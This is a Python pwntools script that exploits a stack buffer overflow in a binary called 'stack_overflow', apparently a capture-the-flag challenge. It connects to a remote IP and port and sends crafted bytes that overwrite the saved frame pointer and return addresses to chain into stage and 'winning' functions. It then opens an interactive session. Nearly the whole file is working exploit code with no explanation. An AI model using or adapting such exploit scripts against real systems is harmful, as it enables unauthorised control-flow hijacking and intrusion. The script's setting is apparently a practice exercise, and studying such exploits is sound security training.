#!/usr/bin/env python3

from pwn import *

STACK_OFFSET = -0xc

context(arch='amd64', os='linux')

e = ELF('./stack_overflow')

r = remote('111.186.57.85', 30013)

# Stack Overflooooow
print(r.recv().decode(), end='')

# Stage1
print(r.recv().decode(), end='')


payload = []

payload += [0xbe, 0xba, 0xfe, 0xca]
payload += [0xef, 0xbe, 0xad, 0xde]
for i in range(9):
    payload += [i, 0xbe, 0xad, 0xde]

# !
payload += [0x21, 0x43, 0x65, 0x87]
# stage_1_key += util.packing.pack(ret_addr,
#  word_size = 64, endianness = 'little')
# print(bytes(stage_1_key))

stage_1_ret_addr = e.symbols['stage3']
print("stage 1 ret addr:", stage_1_ret_addr)

# payload += [0xbe, 0xba, 0xfe, 0xca]
# payload += [0xef, 0xbe, 0xad, 0xde]
# !

payload += [0xf0, 0xbc, 0x29, 0x28]
# !
payload += [0xff, 0x7f, 0x00, 0x00]
# should be 0x7fffffffdee0

payload += util.packing.pack(stage_1_ret_addr,
                             word_size=64, endianness='little')

# Stage2
# print(r.recv().decode(), end='')
# payload += util.packing.pack(stage_1_ret_addr,
#                              word_size=64, endianness='little')
payload += [0x78, 0x56, 0x34, 0x12]

payload += [0x78, 0x56, 0x34, 0x12]

payload += [0x78, 0x56, 0x34, 0x12]
payload += [0x78, 0x56, 0x34, 0x12]
payload += [0x78, 0x56, 0x34, 0x12]
payload += [0x78, 0x56, 0x34, 0x12]

# !
payload += [0xef, 0xbe, 0xad, 0xde]

# !
payload += [0xbe, 0xba, 0xfe, 0xca]

payload += [0x78, 0x56, 0x34, 0x12]
payload += [0x78, 0x56, 0x34, 0x12]

stage_2_ret_addr = e.symbols['stage2']
# stage_2_ret_addr = 0x400753
# print("stage 2 ret addr (offset by 0xe):", stage_2_ret_addr)
payload += util.packing.pack(stage_2_ret_addr,
                             word_size=64, endianness='little')

stage_3_ret_addr = e.symbols['winning']
# stage_2_ret_addr = 0x400753
# print("stage 2 ret addr (offset by 0xe):", stage_2_ret_addr)
payload += util.packing.pack(stage_3_ret_addr,
                             word_size=64, endianness='little')

with open('./payload.ply', 'wb') as f:
    f.write(bytes(payload))

print("payload len: ", len(payload))
r.send(bytes(payload))


r.interactive()
